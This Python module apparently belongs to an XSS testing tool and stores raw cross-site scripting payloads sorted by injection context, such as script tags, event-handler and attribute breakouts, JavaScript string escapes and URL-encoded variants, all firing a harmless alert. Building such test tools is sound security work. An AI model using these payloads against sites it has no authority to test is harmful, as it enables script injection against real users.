"""
payload_bank.py

Purpose:
Store a baseline list of XSS payloads according to their injection context.

All payloads remain raw (not encoded yet).
The mutators.py file will handle encoding and mutation techniques later.

This file also provides two functions:
1. get_payloads() - Retrieve payloads based on selected context.
2. list_contexts() - Return all available context names.
"""

# ============================================================
# 1. PAYLOAD DATABASE
# ============================================================

# Dictionary named PAYLOADS stores all baseline XSS payloads.
# Each key represents a different injection context.
# Each value contains a list of payload strings.

PAYLOADS = {

    # --------------------------------------------------------
    # A. HTML BODY CONTEXT
    # --------------------------------------------------------
    # Used when user input is inserted directly into HTML content.
    # Example: <div>USER INPUT</div>

    "html_body": [

        "<script>alert('xss-skibidi-kaboom')</script>",
        # Basic XSS payload using a script tag.
        # Tests whether JavaScript inside a script element is allowed.

        "<img src=x onerror=alert('xss-skibidi-kaboom')>",
        # Uses the img element and its onerror event handler.
        # Tests whether JavaScript can execute when image loading fails.

        "<svg onload=alert('xss-skibidi-kaboom')>",
        # Uses SVG onload event handler.
        # Tests whether JavaScript execution through SVG is possible.

        "<iframe srcdoc=\"<script>alert('xss-skibidi-kaboom')</script>\">",
        # Uses iframe srcdoc to provide an HTML document inside an iframe.
        # Tests how the application handles embedded HTML content.

        "<iframe src=\"javascript:alert(`xss-skibidi-kaboom`)\">",
        # Uses a JavaScript URL inside an iframe source.
        # Intended to test handling of JavaScript URLs.
    ],

    # --------------------------------------------------------
    # B. HTML ATTRIBUTE CONTEXT
    # --------------------------------------------------------
    # Used when user input is inserted inside an HTML attribute.
    # Example: <input value="USER INPUT">

    "attribute": [

        "\"><script>alert('xss-skibidi-kaboom')</script>",
        # Attempts to close the existing attribute and inject a script tag.

        "\" onmouseover=\"alert('xss-skibidi-kaboom')",
        # Attempts to introduce an onmouseover event handler.
        # Tests event-handler handling without introducing a new HTML tag.

        "' onfocus='alert(\"xss-skibidi-kaboom\")' autofocus='",
        # Designed for an attribute that uses single quotation marks.
        # Attempts to introduce an onfocus event handler.

        "javascript:alert('xss-skibidi-kaboom')",
        # Uses a JavaScript URL scheme.
        # Relevant to URL-based attributes such as href.
    ],

    # --------------------------------------------------------
    # C. JAVASCRIPT STRING CONTEXT
    # --------------------------------------------------------
    # Used when user input is inserted inside a JavaScript string.
    # Example: var user = "USER INPUT";

    "js_string": [

        "\";alert('xss-skibidi-kaboom');//",
        # Attempts to close a double-quoted string.
        # The // is used to comment out the remaining JavaScript code.

        "';alert('xss-skibidi-kaboom');//",
        # Similar to the previous payload but targets single-quoted strings.

        "\"+alert('xss-skibidi-kaboom')+\"",
        # Uses the JavaScript concatenation operator (+).
        # Tests how input behaves inside string concatenation.

        "${alert('xss-skibidi-kaboom')}",
        # Uses template literal expression syntax.
        # Relevant when input is placed inside a JavaScript template literal.
    ],

    # --------------------------------------------------------
    # D. URL PARAMETER CONTEXT
    # --------------------------------------------------------
    # Used when user input is passed through a URL parameter.
    # Example: /search?q=USER_INPUT

    "url_param": [

        "<script>alert('xss-skibidi-kaboom')</script>",
        # Raw HTML/JavaScript payload without URL encoding.

        "%3Cscript%3Ealert('xss-skibidi-kaboom')%3C/script%3E",
        # URL-encoded version of the script payload.
        # Special characters are represented using percent encoding.

        "%253Cscript%253Ealert('xss-skibidi-kaboom')%253C/script%253E",
        # Double URL-encoded version.
        # The percent sign (%) is encoded again as %25.

        "%3Cimg%20src%3Dx%20onerror%3Dalert('xss-skibidi-kaboom')%3E",
        # URL-encoded image onerror payload.
        # Includes encoded spaces and HTML special characters.
    ],
}


# ============================================================
# 2. GET_PAYLOADS FUNCTION
# ============================================================

def get_payloads(context: str):
    """
    Retrieve the list of payloads based on the selected context.

    Parameter:
        context (str): The context selected by the user.

    Returns:
        A list containing the payloads for that context.

    Raises:
        ValueError if the selected context does not exist.
    """

    # Check whether the requested context exists in PAYLOADS.
    if context not in PAYLOADS:

        # Stop execution and display available context names
        # if the user enters an invalid context.
        raise ValueError(
            f"Unknown context '{context}'. "
            f"Available: {list(PAYLOADS.keys())}"
        )

    # Return the payload list belonging to the selected context.
    return PAYLOADS[context]


# ============================================================
# 3. LIST_CONTEXTS FUNCTION
# ============================================================

def list_contexts():
    """
    Return all available context names for CLI usage.

    Returns:
        A list of context names stored in PAYLOADS.
    """

    # .keys() retrieves all dictionary keys.
    # list() converts the keys into a normal Python list.
    return list(PAYLOADS.keys())